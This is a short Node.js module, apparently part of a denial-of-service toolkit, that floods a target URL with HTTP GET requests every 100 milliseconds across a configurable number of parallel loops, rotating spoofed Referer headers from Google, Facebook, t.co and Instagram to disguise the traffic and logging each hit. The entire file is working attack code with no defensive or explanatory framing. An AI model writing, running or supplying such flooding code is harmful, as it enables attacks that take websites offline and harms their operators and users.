const axios = require('axios');
const chalk = require('chalk');

const referers = [
  'https://google.com',
  'https://facebook.com',
  'https://t.co',
  'https://instagram.com',
];

module.exports = function(target, threads) {
  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      const ref = referers[Math.floor(Math.random() * referers.length)];
      axios.get(target, {
        headers: { Referer: ref }
      })
      .then(() => console.log(chalk.green(`[✓] Referer ${ref}`)))
      .catch(() => console.log(chalk.red(`[x] Referer gagal`)));
    }
  }, 100);
};